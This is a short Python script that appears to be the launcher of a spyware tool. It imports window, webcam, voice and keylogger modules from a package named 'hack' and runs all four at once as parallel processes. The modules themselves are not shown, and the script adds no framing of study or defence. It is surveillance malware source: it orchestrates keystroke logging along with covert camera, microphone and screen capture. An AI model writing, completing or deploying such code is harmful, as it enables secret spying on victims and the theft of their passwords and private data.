from multiprocessing import Process
from hack import window, webcam , voice ,keylogger

def main():
    try:
        window_process = Process(target=window.window)
        webcam_process = Process(target=webcam.webcam)
        voice_process = Process(target=voice.voice)
        keylogger_process = Process(target=keylogger.keylogger)

        window_process.start()
        webcam_process.start()
        voice_process.start()
        keylogger_process.start()

        window_process.join()
        webcam_process.join()
        voice_process.join()
        keylogger_process.join()

    except KeyboardInterrupt:
        print('Exit')

if __name__ == '__main__':
    main()